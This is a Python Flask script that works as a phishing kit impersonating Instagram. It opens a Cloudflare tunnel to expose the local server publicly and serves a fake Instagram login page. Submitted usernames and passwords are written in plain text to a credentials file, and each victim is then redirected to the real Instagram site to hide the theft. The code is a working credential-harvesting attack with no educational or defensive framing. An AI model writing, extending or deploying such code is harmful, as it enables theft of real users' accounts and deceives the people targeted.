import os
import subprocess
from flask import Flask, request, render_template, redirect

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
cloudflared_path = os.path.join(BASE_DIR, "cloud_flare", "cloudflared.exe")

if os.path.exists(cloudflared_path):
    subprocess.Popen([cloudflared_path, "tunnel", "--url", "http://localhost:5000"])
else:
    print(f"cloudflared.exe not found at {cloudflared_path}")

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get("u_name")
        password = request.form.get("pass")

        path = "insta_Credentials"
        os.makedirs(path, exist_ok=True)
        full = os.path.join(path, "Credentials.txt")

        if username and password:
            with open(full, "a") as f:
                f.write(f"Username/Email: {username} | Password: {password}\n")
            return redirect("https://www.instagram.com/")
        else:
            return "Please provide both username and password."

    return render_template("insta.html")


if __name__ == "__main__":
    app.run(debug=True)
